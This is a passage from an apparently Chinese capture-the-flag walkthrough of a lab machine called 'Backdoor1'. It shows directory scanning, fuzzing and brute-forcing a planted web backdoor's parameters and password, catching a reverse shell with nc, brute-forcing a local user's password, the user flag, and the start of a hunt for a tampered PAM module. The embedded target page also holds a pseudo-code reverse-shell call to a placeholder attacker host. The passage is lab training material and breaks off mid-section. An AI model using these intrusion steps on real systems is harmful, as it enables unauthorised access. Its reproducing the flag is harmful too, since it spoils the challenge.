class="hljs-comment">#00FFFF, #FF00B3);</span><br>            transform: scale(1.05);<br>            animation: none;<br>        &#125;<br><br>        footer &#123;<br>            text-align: center;<br>            padding: 30px;<br>            background: rgba(0, 0, 0, 0.8);<br>            border-top: 3px double <span class="hljs-comment">#FF00B3;</span><br>            margin-top: 50px;<br>        &#125;<br><br>        footer p &#123;<br>            color: <span class="hljs-comment">#00FFFF;</span><br>            font-size: 1.1em;<br>            animation: blink 4s infinite;<br>        &#125;<br><br>        .counter &#123;<br>            font-size: 2.5em;<br>            color: <span class="hljs-comment">#FF00B3;</span><br>            margin: 10px 0;<br>            animation: glow 1.5s infinite;<br>        &#125;<br><br>        @media (max-width: 768px) &#123;<br>            h1 &#123; font-size: 2.8em; &#125;<br>            nav ul &#123; flex-direction: column; &#125;<br>            nav li &#123; margin: 10px 0; &#125;<br>            .floating &#123; display: none; &#125;<br>        &#125;<br>    &lt;/style&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>    &lt;div <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;floating1&quot;</span> class=<span class="hljs-string">&quot;floating&quot;</span>&gt;★BACKDOOR★&lt;/div&gt;<br>    &lt;div <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;floating2&quot;</span> class=<span class="hljs-string">&quot;floating spinning&quot;</span>&gt;❂ HACKER ZONE ❂&lt;/div&gt;<br>    &lt;div <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;floating3&quot;</span> class=<span class="hljs-string">&quot;floating&quot;</span>&gt;※ ACCESS ※&lt;/div&gt;<br>    <br>    &lt;header&gt;<br>        &lt;h1&gt;BACKDOOR1&lt;/h1&gt;<br>        &lt;div class=<span class="hljs-string">&quot;subtitle&quot;</span>&gt;✪ CYBERPUNK EDITION ✪&lt;/div&gt;<br>    &lt;/header&gt;<br>    <br>    &lt;nav&gt;<br>        &lt;ul&gt;<br>            &lt;li&gt;&lt;a href=<span class="hljs-string">&quot;#&quot;</span>&gt;★ HOME ★&lt;/a&gt;&lt;/li&gt;<br>            &lt;li&gt;&lt;a href=<span class="hljs-string">&quot;#&quot;</span>&gt;☣ TOOLS ☣&lt;/a&gt;&lt;/li&gt;<br>            &lt;li&gt;&lt;a href=<span class="hljs-string">&quot;#&quot;</span>&gt;✪ EXPLOITS ✪&lt;/a&gt;&lt;/li&gt;<br>            &lt;li&gt;&lt;a href=<span class="hljs-string">&quot;#&quot;</span>&gt;❖ COMMUNITY ❖&lt;/a&gt;&lt;/li&gt;<br>            &lt;li&gt;&lt;a href=<span class="hljs-string">&quot;#&quot;</span>&gt;⚠ CRACKS ⚠&lt;/a&gt;&lt;/li&gt;<br>        &lt;/ul&gt;<br>    &lt;/nav&gt;<br>    <br>    &lt;main&gt;<br>        &lt;section class=<span class="hljs-string">&quot;section&quot;</span>&gt;<br>            &lt;h2&gt;ABOUT BACKDOORS&lt;/h2&gt;<br>            &lt;p&gt;A &lt;span class=<span class="hljs-string">&quot;highlight&quot;</span>&gt;backdoor&lt;/span&gt; is a method to bypass normal authentication and gain unauthorized access to a system.&lt;/p&gt;<br>            &lt;p&gt;In the hacker world, creating &lt;span class=<span class="hljs-string">&quot;highlight&quot;</span>&gt;undetectable backdoors&lt;/span&gt; is an art. From remote access to privilege escalation, we provide elite backdoor solutions.&lt;/p&gt;<br>            <br>            &lt;div style=<span class="hljs-string">&quot;text-align: center; margin: 25px 0;&quot;</span>&gt;<br>                &lt;button class=<span class="hljs-string">&quot;btn&quot;</span>&gt;PREMIUM BACKDOOR KIT&lt;/button&gt;<br>                &lt;button class=<span class="hljs-string">&quot;btn&quot;</span>&gt;DOWNLOAD TOOLS&lt;/button&gt;<br>            &lt;/div&gt;<br>        &lt;/section&gt;<br>        <br>        &lt;section class=<span class="hljs-string">&quot;section&quot;</span>&gt;<br>            &lt;h2&gt;ADVANCED TECHNIQUES&lt;/h2&gt;<br>            &lt;p&gt;✔ Rootkit-level hidden backdoors&lt;/p&gt;<br>            &lt;p&gt;✔ Web application backdoors&lt;/p&gt;<br>            &lt;p&gt;✔ Hardware-level BIOS/UEFI backdoors&lt;/p&gt;<br>            &lt;p&gt;✔ Memory-resident fileless backdoors&lt;/p&gt;<br>            &lt;p&gt;✔ Encrypted communication tunnels&lt;/p&gt;<br>            <br>            &lt;code&gt;<br>                // Backdoor activation code example<br>                void <span class="hljs-function"><span class="hljs-title">activate_backdoor</span></span>() &#123;<br>                    enable_stealth();<br>                    create_hidden_service();<br>                    open_reverse_shell(<span class="hljs-string">&quot;hacker-server.com:31337&quot;</span>);<br>                    elevate_privileges();<br>                    maintain_persistence();<br>                &#125;<br>            &lt;/code&gt;<br>        &lt;/section&gt;<br>        <br>        &lt;section class=<span class="hljs-string">&quot;section&quot;</span>&gt;<br>            &lt;h2&gt;ELITE HACKER TEAM&lt;/h2&gt;<br>            &lt;p&gt;Our world-class security researchers and pentesters:&lt;/p&gt;<br>            &lt;p&gt;✪ &lt;span class=<span class="hljs-string">&quot;highlight&quot;</span>&gt;NeoShadow&lt;/span&gt; - Backdoor maestro&lt;/p&gt;<br>            &lt;p&gt;✪ &lt;span class=<span class="hljs-string">&quot;highlight&quot;</span>&gt;CipherMaster&lt;/span&gt; - Cryptanalysis expert&lt;/p&gt;<br>            &lt;p&gt;✪ &lt;span class=<span class="hljs-string">&quot;highlight&quot;</span>&gt;GhostRider&lt;/span&gt; - Evasion specialist&lt;/p&gt;<br>            &lt;p&gt;✪ &lt;span class=<span class="hljs-string">&quot;highlight&quot;</span>&gt;NetPhantom&lt;/span&gt; - Network penetration ninja&lt;/p&gt;<br>            <br>            &lt;div style=<span class="hljs-string">&quot;text-align: center; margin-top: 30px;&quot;</span>&gt;<br>                &lt;div&gt;TOTAL VISITORS:&lt;/div&gt;<br>                &lt;div class=<span class="hljs-string">&quot;counter&quot;</span>&gt;313337&lt;/div&gt;<br>            &lt;/div&gt;<br>        &lt;/section&gt;<br>    &lt;/main&gt;<br>    <br>    &lt;footer&gt;<br>        &lt;p&gt;Backdoor1 Security Research Group © 2023 | ★ FOR EDUCATIONAL PURPOSES ONLY ★&lt;/p&gt;<br>        &lt;p style=<span class="hljs-string">&quot;font-size: 0.9em; margin-top: 10px; color: #FF00B3;&quot;</span>&gt;✪ WARNING: Unauthorized access is illegal ✪&lt;/p&gt;<br>    &lt;/footer&gt;<br>    <br>    &lt;script&gt;<br>        document.addEventListener(<span class="hljs-string">&#x27;DOMContentLoaded&#x27;</span>, <span class="hljs-function"><span class="hljs-title">function</span></span>() &#123;<br>            const floaters = document.querySelectorAll(<span class="hljs-string">&#x27;.floating&#x27;</span>);<br>            floaters.forEach(item =&gt; &#123;<br>                item.addEventListener(<span class="hljs-string">&#x27;mouseenter&#x27;</span>, <span class="hljs-function"><span class="hljs-title">function</span></span>() &#123;<br>                    this.style.animation = <span class="hljs-string">&#x27;none&#x27;</span>;<br>                    this.style.transform = <span class="hljs-string">&#x27;scale(1.5)&#x27;</span>;<br>                    this.style.color = <span class="hljs-string">&#x27;#00FF00&#x27;</span>;<br>                &#125;);<br>                <br>                item.addEventListener(<span class="hljs-string">&#x27;mouseleave&#x27;</span>, <span class="hljs-function"><span class="hljs-title">function</span></span>() &#123;<br>                    this.style.animation = <span class="hljs-string">&#x27;&#x27;</span>;<br>                    this.style.transform = <span class="hljs-string">&#x27;&#x27;</span>;<br>                    this.style.color = <span class="hljs-string">&#x27;&#x27;</span>;<br>                &#125;);<br>            &#125;);<br>            <br>            const buttons = document.querySelectorAll(<span class="hljs-string">&#x27;.btn&#x27;</span>);<br>            buttons.forEach(btn =&gt; &#123;<br>                btn.addEventListener(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-function"><span class="hljs-title">function</span></span>() &#123;<br>                    this.style.transform = <span class="hljs-string">&#x27;scale(0.9)&#x27;</span>;<br>                    this.style.background = <span class="hljs-string">&#x27;linear-gradient(45deg, #00FF00, #FFFF00)&#x27;</span>;<br>                    this.style.color = <span class="hljs-string">&#x27;#000&#x27;</span>;<br>                    <br>                    setTimeout(() =&gt; &#123;<br>                        this.style.transform = &#x27;&#x27;;<br>                        this.style.background = &#x27;&#x27;;<br>                        this.style.color = &#x27;&#x27;;<br>                        alert(&#x27;★ BACKDOOR ACCESS ACTIVATED! Requires privileged credentials ★&#x27;);<br>                    &#125;, <span class="hljs-number">300</span>);<br>                &#125;);<br>            &#125;);<br>            <br>            const counter = document.querySelector(&#x27;.counter&#x27;);<br>            let count = parseInt(counter.textContent);<br>            setInterval(() =&gt; &#123;<br>                count += Math.floor(Math.random() * <span class="hljs-number">5</span>) + <span class="hljs-number">1</span>;<br>                counter.textContent = count;<br>            &#125;, <span class="hljs-number">3000</span>);<br>        &#125;);<br>    &lt;/script&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><h2 id="1、目录扫描"><a href="#1、目录扫描" class="headerlink" title="1、目录扫描"></a>1、目录扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/config]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.51/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,bak<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.51/<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              txt,html,bak,php<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.php                 (Status: 403) [Size: 277]<br>/.html                (Status: 403) [Size: 277]<br>/index.html           (Status: 200) [Size: 12033]<br>/backdoor.php         (Status: 200) [Size: 0]<br>/.php                 (Status: 403) [Size: 277]<br>/.html                (Status: 403) [Size: 277]<br>/server-status        (Status: 403) [Size: 277]<br>Progress: 1102800 / 1102805 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>找到一个<code>backdoor.php</code>后门文件，但是大小为<code>0</code>，尝试访问</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/backdoor1]<br>└─# curl http://192.168.2.51/backdoor.php<br></code></pre></td></tr></table></figure><p>没有任何回显</p><h2 id="2、FUFF爆破"><a href="#2、FUFF爆破" class="headerlink" title="2、FUFF爆破"></a>2、FUFF爆破</h2><p>根据页面的提示，根据找到的后门文件<code>backdoor.php</code>，尝试爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/config]<br>└─# ffuf -u <span class="hljs-string">&quot;http://192.168.2.51/backdoor.php?FUZZ=id&quot;</span> -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  --fw 1<br><br>        /<span class="hljs-string">&#x27;___\  /&#x27;</span>___\           /<span class="hljs-string">&#x27;___\       </span><br><span class="hljs-string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span><br><span class="hljs-string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span><br><span class="hljs-string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span><br><span class="hljs-string">         \ \_\   \ \_\  \ \____/  \ \_\       </span><br><span class="hljs-string">          \/_/    \/_/   \/___/    \/_/       </span><br><span class="hljs-string"></span><br><span class="hljs-string">       v2.1.0-dev</span><br><span class="hljs-string">________________________________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string"> :: Method           : GET</span><br><span class="hljs-string"> :: URL              : http://192.168.2.51/backdoor.php?FUZZ=id</span><br><span class="hljs-string"> :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span><br><span class="hljs-string"> :: Follow redirects : false</span><br><span class="hljs-string"> :: Calibration      : false</span><br><span class="hljs-string"> :: Timeout          : 10</span><br><span class="hljs-string"> :: Threads          : 40</span><br><span class="hljs-string"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span><br><span class="hljs-string"> :: Filter           : Response words: 1</span><br><span class="hljs-string">________________________________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string">password                [Status: 200, Size: 10, Words: 3, Lines: 1, Duration: 1ms]</span><br><span class="hljs-string">cmd                     [Status: 200, Size: 15, Words: 3, Lines: 1, Duration: 0ms]</span><br><span class="hljs-string">:: Progress: [220559/220559] :: Job [1/1] :: 10000 req/sec :: Duration: [0:00:29] :: Errors: 0 ::</span><br></code></pre></td></tr></table></figure><p>找到两个参数，<code>cmd</code>和<code>password</code></p><p>拼接cmd<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507101244605.png"></p><p>提示需要密码，再加上password，提示密码错误<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507101245085.png"></p><p>直接爆破，找到password&#x3D;iloveyou</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/config]<br>└─# ffuf -u <span class="hljs-string">&quot;http://192.168.2.51/backdoor.php?cmd=id&amp;password=FUZZ&quot;</span> -w /usr/share/wordlists/rockyou.txt   --fw 2 <br><br>        /<span class="hljs-string">&#x27;___\  /&#x27;</span>___\           /<span class="hljs-string">&#x27;___\       </span><br><span class="hljs-string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span><br><span class="hljs-string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span><br><span class="hljs-string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span><br><span class="hljs-string">         \ \_\   \ \_\  \ \____/  \ \_\       </span><br><span class="hljs-string">          \/_/    \/_/   \/___/    \/_/       </span><br><span class="hljs-string"></span><br><span class="hljs-string">       v2.1.0-dev</span><br><span class="hljs-string">________________________________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string"> :: Method           : GET</span><br><span class="hljs-string"> :: URL              : http://192.168.2.51/backdoor.php?cmd=id&amp;password=FUZZ</span><br><span class="hljs-string"> :: Wordlist         : FUZZ: /usr/share/wordlists/rockyou.txt</span><br><span class="hljs-string"> :: Follow redirects : false</span><br><span class="hljs-string"> :: Calibration      : false</span><br><span class="hljs-string"> :: Timeout          : 10</span><br><span class="hljs-string"> :: Threads          : 40</span><br><span class="hljs-string"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span><br><span class="hljs-string"> :: Filter           : Response words: 2</span><br><span class="hljs-string">________________________________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string">iloveyou                [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 371ms]</span><br></code></pre></td></tr></table></figure><h1 id="四、获取www-data"><a href="#四、获取www-data" class="headerlink" title="四、获取www-data"></a>四、获取www-data</h1><p>根据密码，直接访问，发现没有回显<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507101301776.png"><br>尝试ping-kali看看有没有流量<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507101304204.png"></p><p>发现有流量回显，那直接反弹shell即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/config]<br>└─# tcpdump -A -n icmp -i eth1<br>tcpdump: verbose output suppressed, use -v[v]... <span class="hljs-keyword">for</span> full protocol decode<br>listening on eth1, link-type EN10MB (Ethernet), snapshot length 262144 bytes<br>13:03:42.954796 IP 192.168.2.51 &gt; 192.168.2.4: ICMP <span class="hljs-built_in">echo</span> request, <span class="hljs-built_in">id</span> 1422, <span class="hljs-built_in">seq</span> 1, length 64<br>E..T..@.@......3.......@.....Ioh............................ !<span class="hljs-string">&quot;#$%&amp;&#x27;()*+,-./01234567</span><br><span class="hljs-string">13:03:42.954831 IP 192.168.2.4 &gt; 192.168.2.51: ICMP echo reply, id 1422, seq 1, length 64</span><br><span class="hljs-string">E..T....@..i.......3.. @.....Ioh............................ !&quot;</span>#$%&amp;<span class="hljs-string">&#x27;()*+,-./01234567</span><br><span class="hljs-string">13:03:43.965552 IP 192.168.2.51 &gt; 192.168.2.4: ICMP echo request, id 1422, seq 2, length 64</span><br><span class="hljs-string">E..T..@.@..a...3.............Ioh....6....................... !&quot;#$%&amp;&#x27;</span>()*+,-./01234567<br>13:03:43.965588 IP 192.168.2.4 &gt; 192.168.2.51: ICMP <span class="hljs-built_in">echo</span> reply, <span class="hljs-built_in">id</span> 1422, <span class="hljs-built_in">seq</span> 2, length 64<br>E..T.r..@..........3.........Ioh....6....................... !<span class="hljs-string">&quot;#$%&amp;&#x27;()*+,-./01234567</span><br></code></pre></td></tr></table></figure><p>反弹shell<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507101307137.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/config]<br>└─# nc -lvvp 4444          <br>listening on [any] 4444 ...<br>192.168.2.51: inverse host lookup failed: Unknown host<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.51] 39414<br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>www-data@Backdoor1:/var/www/html$ <br></code></pre></td></tr></table></figure><h1 id="五、获取USER权限"><a href="#五、获取USER权限" class="headerlink" title="五、获取USER权限"></a>五、获取USER权限</h1><p>尝试进入<code>morri</code>家目录，发现没有权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Backdoor1:/home$ <span class="hljs-built_in">cd</span> morri/<br>bash: <span class="hljs-built_in">cd</span>: morri/: Permission denied<br></code></pre></td></tr></table></figure><p>尝试切换到<code>morri</code>用户，发现需要密码，使用<code>suForce</code>爆破密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Backdoor1:/tmp$ ./suForce -u morri -w pass.txt <br>            _____                          <br> ___ _   _ |  ___|__  _ __ ___ ___   <br>/ __| | | || |_ / _ \| <span class="hljs-string">&#x27;__/ __/ _ \ </span><br><span class="hljs-string">\__ \ |_| ||  _| (_) | | | (_|  __/  </span><br><span class="hljs-string">|___/\__,_||_|  \___/|_|  \___\___|  </span><br><span class="hljs-string">───────────────────────────────────</span><br><span class="hljs-string"> code: d4t4s3c     version: v1.0.0</span><br><span class="hljs-string">───────────────────────────────────</span><br><span class="hljs-string">🎯 Username | morri</span><br><span class="hljs-string">📖 Wordlist | pass.txt</span><br><span class="hljs-string">🔎 Status   | 1/10001/0%/morri</span><br><span class="hljs-string">💥 Password | morri</span><br><span class="hljs-string">───────────────────────────────────</span><br></code></pre></td></tr></table></figure><p>得到密码：<code>morri</code></p><p>切换到<code>morri</code>用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Backdoor1:/tmp$ su morri<br>Password: <br>morri@Backdoor1:/tmp$ <span class="hljs-built_in">id</span><br>uid=1000(morri) gid=1000(morri) <span class="hljs-built_in">groups</span>=1000(morri)<br></code></pre></td></tr></table></figure><p><strong>USER FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">morri@Backdoor1:~$ <span class="hljs-built_in">cat</span> user.txt<br>flag&#123;user-4645258dd0f71f7f430bb4f3c37748e6&#125;<br></code></pre></td></tr></table></figure><h1 id="六、权限提升"><a href="#六、权限提升" class="headerlink" title="六、权限提升"></a>六、权限提升</h1><p>使用<code>sudo -l</code>，发现需要密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">morri@Backdoor1:~$ <span class="hljs-built_in">sudo</span> -l<br><br>We trust you have received the usual lecture from the <span class="hljs-built_in">local</span> System<br>Administrator. It usually boils down to these three things:<br><br>    <span class="hljs-comment">#1) Respect the privacy of others.</span><br>    <span class="hljs-comment">#2) Think before you type.</span><br>    <span class="hljs-comment">#3) With great power comes great responsibility.</span><br><br>[<span class="hljs-built_in">sudo</span>] password <span class="hljs-keyword">for</span> morri: <br></code></pre></td></tr></table></figure><h2 id="1、方法一：查看最近修改过的文件"><a href="#1、方法一：查看最近修改过的文件" class="headerlink" title="1、方法一：查看最近修改过的文件"></a>1、方法一：查看最近修改过的文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs bash">morri@Backdoor1:~$ find / -<span class="hljs-built_in">type</span> f -newermt <span class="hljs-string">&quot;2025-07-05&quot;</span> ! -newermt <span class="hljs-string">&quot;2025-07-10&quot;</span> ! -path <span class="hljs-string">&#x27;/proc/*&#x27;</span> ! -path <span class="hljs-string">&#x27;/sys/*&#x27;</span> ! -path <span class="hljs-string">&#x27;/run/*&#x27;</span> 2&gt;/dev/null<br>/usr/lib/x86_64-linux-gnu/security/pam_unix.so<br>/home/morri/.bash_logout<br>/home/morri/.bashrc<br>/home/morri/user.txt<br>/home/morri/.profile<br>/etc/gshadow-<br>/etc/sudoers<br>/etc/subgid-<br>/etc/apt/sources.list<br>/etc/hosts<br>/etc/ld.so.cache<br>/etc/shadow-<br>/etc/subgid<br>/etc/passwd-<br>/etc/gshadow<br>/etc/group-<br>/etc/shadow<br>/etc/subuid-<br>/etc/php/8.3/apache2/php.ini<br>/etc/subuid<br>/etc/group<br>/etc/hostname<br>/etc/resolv.conf<br>/etc/passwd<br>/var/www/html/index.html<br>/var/www/html/backdoor.php<br>/var/backups/apt.extended_states.0<br>/var/log/debug<br>/var/log/daemon.log.1<br>/var/log/apt/eipp.log.xz<br>/var/log/apt/term.log<br>/var/log/apt/history.log<br>/var/log/kern.log<br>/var/log/btmp<br>/var/log/auth.log.1<br>/var/log/dpkg.log<br>/var/log/alternatives.log<br>/var/log/lastlog<br>/var/log/wtmp<br>/var/log/faillog<br>/var/log/debug.1<br>/var/log/syslog.3.gz<br>/var/log/syslog.2.gz<br>/var/log/user.log<br>/var/log/messages.1<br>/var/log/kern.log.1<br>/var/log/journal/52a22a6e47cb4a5995fb43c3554baa0e/system@0006396a764f42ae-bf156f4b6c4eb513.journal~<br>/var/log/journal/52a22a6e47cb4a5995fb43c3554baa0e/system@0006397e06552d02-5794aba3a99c89ef.journal~<br>/var/log/journal/52a22a6e47cb4a5995fb43c3554baa0e/user-1000@0006396aa29dceaf-fdca4d5bafaa45b8.journal~<br>/var/lib/dpkg/lock<br>/var/lib/dpkg/info/libfl2:amd64.list<br>/var/lib/dpkg/info/curl.list<br>/var/lib/dpkg/info/m4.list<br>/var/lib/dpkg/info/flex.list<br>/var/lib/dpkg/info/libpam0g-dev:amd64.list<br>/var/lib/dpkg/info/libsigsegv2:amd64.list<br>/var/lib/dpkg/info/wget.list<br>/var/lib/dpkg/info/libfl-dev:amd64.list<br>/var/lib/dpkg/info/netcat-openbsd.list<br>/var/lib/dpkg/info/bison.list<br>/var/lib/dpkg/info/netcat.list<br>/var/lib/dpkg/info/libpam0g:amd64.list<br>/var/lib/dpkg/alternatives/yacc<br>/var/lib/dpkg/alternatives/nc<br>/var/lib/dpkg/triggers/Lock<br>/var/lib/dpkg/status<br>/var/lib/dpkg/status-old<br>/var/lib/apt/lists/mirrors.aliyun.com_debian_dists_bullseye-backports_InRelease<br>/var/lib/apt/lists/packages.sury.org_php_dists_bullseye_main_binary-amd64_Packages<br>/var/lib/apt/lists/packages.sury.org_php_dists_bullseye_InRelease<br>/var/lib/apt/lists/packages.sury.org_php_dists_bullseye_main_source_Sources<br>/var/lib/apt/daily_lock<br>/var/lib/apt/extended_states<br>/var/lib/systemd/random-seed<br>/var/lib/systemd/timesync/clock<br>/var/lib/systemd/timers/stamp-apt-daily-upgrade.timer<br>/var/cache/apt/pkgcache.bin<br>/var/cache/apt/srcpkgcache.bin<br>/var/cache/debconf/templates.dat<br>/var/cache/debconf/config.dat-old<br>/var/cache/debconf/config.dat<br>/var/cache/debconf/templates.dat-old<br></code></pre></td></tr></table></figure><p>发现修改过<code>/usr/lib/x86_64-linux-gnu/security/pam_unix.so</code>里面的文件</p><h2 id="2、方法二：dpkg-V"><a href="#2、方法二：dpkg-V" class="headerlink" title="2、方法二：dpkg -V"></a>2、方法二：dpkg -V</h2><p>或者使用<code>dpkg -V</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 